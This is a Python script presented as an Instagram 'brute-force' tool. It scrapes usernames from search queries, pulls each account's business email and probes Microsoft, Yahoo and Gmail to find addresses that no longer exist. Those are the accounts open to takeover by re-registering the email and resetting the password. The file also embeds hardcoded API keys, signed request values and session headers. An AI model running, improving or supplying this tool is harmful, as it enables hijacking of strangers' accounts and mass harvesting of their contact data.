import os
import sys
import hashlib
import mechanize
import requests
from time import sleep




if sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
else:
    os.system("clear")


def rhaby(s):
    for ASU in s + '\n':
        sys.stdout.write(ASU)
        sys.stdout.flush()
        sleep(50. / 1000)


API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
__banner__ = """\033[1;33m
 |\   /| IBFrhaby - insta-Brute-Force
  \|_|/  Author: ArHaBy*
  /. .\  Version: 2.0v
 =\_Y_/= Telegram: @ciku370
  {>o<}  Insta: @ali.rhaby
=============================================="""
print(__banner__)
rhaby("$ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ")
rhaby("$ 1- hashtag user")
rhaby("$")
rhaby("$ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ")
rhaby("$ 2- IBFrhaby")
rhaby("$")
ali1 = input("$ enter number tool : ")
if ali1 == '2':
    import requests
    import os
    from bs4 import BeautifulSoup

    


    class Instagram:
        def __init__(self, username):
            self.username = str(username)

        def get_request(self):
            """
            Returns page contents
            :return str:
            """
            request = requests.get('https://www.instagram.com/' + self.username)
            if request.status_code == 200:
                return request.content
            else:
                raise Exception(" This username is not used: {}".format(self.username))

        def content_parser(self):
            """
            Returns parsed page contents
            :return str:
            """
            content = self.get_request()
            source = BeautifulSoup(content, 'html.parser')
            return source

        def get_info(self):
            """
            Returns instagram infos
            :return dict:
            """
            source = self.content_parser()
            description = source.find("meta", {"property": "og:description"}).get("content")
            info_list = description.split("-")[0]
            followers = info_list[0:info_list.index("Followers")]
            info_list = info_list.replace(followers + "Followers, ", "")
            following = info_list[0:info_list.index("Following")]
            info_list = info_list.replace(following + "Following, ", "")
            posts = info_list[0:info_list.index("Posts")]
            results = {"followers": followers, "following": following, "posts": posts}
            return results

        def print_info(self):

            url = "https://www.instagram.com/" + self.username + "/?__a=1"
            r = requests.get(url)
            email = str(r.json()["graphql"]["user"]["business_email"])
            
            photo = str(r.json()["graphql"]["user"]["profile_pic_url_hd"])
            id = str(r.json()["graphql"]["user"]["id"])
            info = self.get_info()
            # ______________________________________
            s = '35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{"q":\"' + self.username + '\","guid":"b449de3c-1663-47bc-8cca-e83b570b60d1","device_id":"615d8b7997acf12b"}'
            userAAgent = "Instagram 99.4.0"
            url = 'https://i.instagram.com/api/v1/users/lookup/'
            myobj = {'signed_body': s, "ig_sig_key_version": "9"}
            x = requests.post(url, headers={'User-Agent': userAAgent}, data=myobj)
            aliii = (email[-12:-1])
            yhaooo = (email[-9:-1])
            green = "\033[0;32m"
            red = "\033[0;31m"
            
            
            if (aliii == "@outlook.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(info["followers"]))
                    print(" Following: {}".format(info["following"]))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(info["followers"]) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
            elif (aliii == "@hotmail.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(info["followers"]))
                    print(" Following: {}".format(info["following"]))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(info["followers"]) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")

            elif (aliii == "@outlook.s"):
                print(green + "[*] Trying user: {}".format(self.username))
                aaa = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
                payload = ''
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                response = requests.get(aaa, data=payload, headers=headers)
                if "Neither" in response.text:
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(info["followers"]))
                    print(" Following: {}".format(info["following"]))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(info["followers"]) + "\n" + email + "\n")
                    print("")

                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
                        
            elif (yhaooo == "yahoo.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                with open('NotAvailable.txt', 'a') as x:
                    x.write(email + "\n")
                import os, sys, mechanize, re
                from requests.exceptions import ConnectionError

                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
                yahoo = re.compile('@.*')
                otw = yahoo.search(email).group()
                if 'yahoo.com' in otw:
                    br.open(
                        'https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                    br._factory.is_html = True
                    br.select_form(nr=0)
                    br['username'] = email
                    klik = br.submit().read()
                    jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                    try:
                        pek = jok.search(klik).group()
                    except:
                        print(red + "[*] Trying: " + email)

                    if '"messages.ERROR_INVALID_USERNAME">' in pek:
                        print(' ☠' * 15)
                        print("")
                        print(" user: {}".format(self.username))
                        print(" Followers: {}".format(info["followers"]))
                        print(" Following: {}".format(info["following"]))
                        print(green + ' Available : ' + email)
                        with open('Available.txt', 'a') as x:
                            x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(info["followers"]) + "\n" + email + "\n")
                        print("")
                    
                        
            elif (yhaooo == "gmail.co"):
                print(green + "[*] Trying user: {}".format(self.username))
                from os import system
                from sys import stdout, exit
                from validate_email import validate_email

                
                is_valid = validate_email(email, verify=True)
                if str(is_valid).upper() == "TRUE":
                    print(' ☠' * 15)
                    print("")
                    print(" user: {}".format(self.username))
                    print(" Followers: {}".format(info["followers"]))
                    print(" Following: {}".format(info["following"]))
                    print(green + ' Available : ' + email)
                    with open('Available.txt', 'a') as x:
                        x.write("☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ " + "\n" + " user: {}".format(self.username) + "\n" + " Followers: {}".format(info["followers"]) + "\n" + email + "\n")
                    print("")
                else:
                    with open('NotAvailable.txt', 'a') as x:
                        x.write(email + "\n")
                        
                
            else:
                print(red + "[*] User Not Bussins : {}".format(self.username))
                
    class Helper:
        @staticmethod
        def read_file(filename):
            """
            Returns account lists
            :param filename:
            :return list:
            """
            accounts = [line.rstrip('\n') for line in open(filename, encoding="utf8")]
            return accounts

        @staticmethod
        def retry():
            """
            Decides wanna try again
            :return boolean:
            """
            q = input(" Press E to repeat operation or press H to exit the program: ")
            if q.upper() == "E":
                os.system("cls||clear")
                return True
            else:
                return False


    if __name__ == "__main__":
        while True:
            accounts = Helper.read_file("accounts.txt")
            for account in accounts:
                info = Instagram(account)
                try:
                    info.print_info()
                except Exception as e:
                    print(e)

            retry = Helper.retry()
            if not retry:
                break

if ali1 == '1':
    import requests
    import json
    from time import sleep


    def rhaby(s):
        for ASU in s + '\n':
            sys.stdout.write(ASU)
            sys.stdout.flush()
            sleep(50. / 1000)


    rhaby = 'welcome to hashtag user'

    os.system("rm accounts.txt")

    r = requests.Session()


    def sear():
        fileuser = open('accounts.txt', 'w')
        a1 = input('hashtag1: ')
        a2 = input('hashtag2: ')
        a3 = input('hashtag3: ')
        a4 = input('hashtag4: ')
        a5 = input('hashtag5: ')
        a6 = input('hashtag6: ')
        try:
            urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(a1)
            zero = 0
            while True:
                data = r.get(urlse).json()
                idname = str(data['users'][zero].get('user').get('username'))
                fileuser.write(idname + '\n')
                zero += 1
                print("[*] User : {}".format(idname))
        except Exception as e:
            try:
                urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(a2)
                zero = 0
                while True:
                    data = r.get(urlse).json()
                    idname = str(data['users'][zero].get('user').get('username'))
                    fileuser.write(idname + '\n')
                    zero += 1
                    print("[*] User : {}".format(idname))
            except:
                try:
                    urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(
                        a3)
                    zero = 0
                    while True:
                        data = r.get(urlse).json()
                        idname = str(data['users'][zero].get('user').get('username'))
                        fileuser.write(idname + '\n')
                        zero += 1
                        print("[*] User : {}".format(idname))
                except:
                    try:
                        urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(
                            a4)
                        zero = 0
                        while True:
                            data = r.get(urlse).json()
                            idname = str(data['users'][zero].get('user').get('username'))
                            fileuser.write(idname + '\n')
                            zero += 1
                            print("[*] User : {}".format(idname))
                    except:
                        try:
                            urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(
                                a5)
                            zero = 0
                            while True:
                                data = r.get(urlse).json()
                                idname = str(data['users'][zero].get('user').get('username'))
                                fileuser.write(idname + '\n')
                                zero += 1
                                print("[*] User : {}".format(idname))
                        except:
                            try:
                                urlse = 'https://www.instagram.com/web/search/topsearch/?context=blended&query={}&count=25'.format(
                                    a6)
                                zero = 0
                                while True:
                                    data = r.get(urlse).json()
                                    idname = str(data['users'][zero].get('user').get('username'))
                                    fileuser.write(idname + '\n')
                                    zero += 1
                                    print("[*] User : {}".format(idname))
                            except:
                                fileuser.close()

        print("Done..""\n""telegram:ciku370")


    sear()

